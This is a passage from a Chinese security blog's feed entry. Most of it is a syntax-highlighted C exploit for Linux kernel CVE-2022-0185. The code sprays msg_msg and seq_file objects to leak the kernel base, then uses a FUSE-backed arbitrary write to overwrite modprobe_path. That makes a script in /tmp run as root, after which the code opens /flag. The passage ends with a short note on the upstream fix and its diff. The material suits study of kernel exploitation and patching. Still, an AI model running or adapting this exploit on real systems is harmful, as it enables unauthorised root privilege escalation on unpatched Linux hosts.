/flag&quot;</span>;<br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>], fake_msg[<span class="hljs-number">0x100</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(evil_buf));<br>    <span class="hljs-built_in">strcpy</span>(evil_buf, <span class="hljs-string">&quot;arttnba3/tmp/evil.sh&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br><br>    <span class="hljs-comment">/* fake msg_msg with `next` pointing to modprobe_path*/</span><br>    buildMsg(fake_msg, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;&quot;</span>, fake_msg + <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first by of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @param buf buf to write to next object</span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">oobWritePrepare</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leakKernelBase</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <span class="hljs-type">int</span> msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM];<br>    <span class="hljs-type">char</span> m_ts_buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">uint64_t</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* create message queue */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create message queue for data leaking...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray msg_msg in half of message queues and seq_file */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fs_fd = oobWritePrepare();<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <br>             <span class="hljs-string">&quot;arttnbaarttnbaarttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* spray msg_msg into the left half of message queues and seq_files */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in another half of message queues and seq_files..&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* oob write to overwrite m_ts of one msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(m_ts_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(m_ts_buf));<br>    *((<span class="hljs-type">long</span>*) m_ts_buf) = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span>;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, m_ts_buf, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* spray more seq_operations */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray more seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for oob read */</span><span class="hljs-type">size_t</span> data_leak = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for oob reading...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> rcvsz;<br>    <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">if</span> ((rcvsz = peekMsg(msqid[i], buf, <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span> - <span class="hljs-number">8</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] failed to read at %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* normal queue, just ignore */</span><br>        <span class="hljs-keyword">if</span> (rcvsz == (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xfd0</span>) / <span class="hljs-number">8</span>; j++) &#123;<br>            <span class="hljs-comment">//printf(&quot;[----data dump][%d] %p\n&quot;, j, buf[j]);</span><br>            <span class="hljs-keyword">if</span> (buf[j] &gt; kernel_base &amp;&amp; ((buf[j] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x4d0</span>)) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get data leak: %lx\n&quot;</span>, buf[j]);<br>                data_leak = buf[j];<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">if</span> (data_leak == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = data_leak - <span class="hljs-number">0xffffffff813834d0</span>;<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] modprobe_path: %lx\n&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitraryWriteByMsg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid, evil_file_fd;<br>    <span class="hljs-type">char</span> *nearby_page, *evil_page;<br>    <span class="hljs-type">int</span> msg_sz;<br><br>    msg_sz = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                             MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-type">char</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(nearby_page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br>    <br>    exp_fs_fd = oobWritePrepare();<br><br>    writeMsg(msqid, nearby_page - <span class="hljs-number">0xfd0</span> + <span class="hljs-number">8</span>, msg_sz, MSG_TYPE);<br>    <br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM], leak_msqid[MSG_QUEUE_NUM], shell_fd;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-type">uint64_t</span> *data;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">/* register for FUSE */</span><br>    system(<span class="hljs-string">&quot;mkdir -p &quot;</span> EVIL_MOUNT_PATH);<br>    <span class="hljs-keyword">if</span> (fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>                  &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to create FUSE!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* leak kernel base */</span><br>    leakKernelBase();<br><br>    <span class="hljs-comment">/* prepare file for triggering modprobe_path */</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br><br>    <span class="hljs-comment">/* prepare file for fake modprobe_path */</span><br>    shell_fd = open(<span class="hljs-string">&quot;/tmp/evil.sh&quot;</span>, O_RDWR | O_CREAT);<br>    write(shell_fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(shell_fd);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/evil.sh&quot;</span>);<br><br>    <span class="hljs-comment">/* exploit */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> flag_fd;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] trying arbitrary write for no.%d time...\n&quot;</span>, i);<br><br>        arbitraryWriteByMsg();<br>        system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>        flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>        <span class="hljs-keyword">if</span> (flag_fd &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>该漏洞在内核主线的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29310e8aa03fcbdb41fc92c521756">这个 commit</a> 当中被修复，主要就是将减法换成了加法，避免了无符号整型下溢的问题，笔者认为这个修复还是比较成功的：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="hljs-comment">index b7e43a780a625..24ce12f0db32e 100644</span><br><span class="hljs-comment">--- a/fs/fs_context.c</span><br><span class="hljs-comment">+++ b/fs/fs_context.c</span><br><span class="hljs-meta">@@ -548,7 +548,7 @@</span> static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)<br>       param-&gt;key);<br> &#125;<br> <br><span class="hljs-deletion">-if (len &gt; PAGE_SIZE - 2 - size)</span><br><span class="hljs-addition">+if (size + len + 2 &gt; PAGE_SIZE)</span><br> return invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;);<br> if (strchr(param-&gt;key, &#x27;,&#x27;) ||<br>     (param-&gt;type == fs_value_is_string &amp;&amp;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;还是 mount 好&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>【EXPR.0x01】MIT 6.858 课程实验报告</title>
    <link href="http://blog.arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/"/>
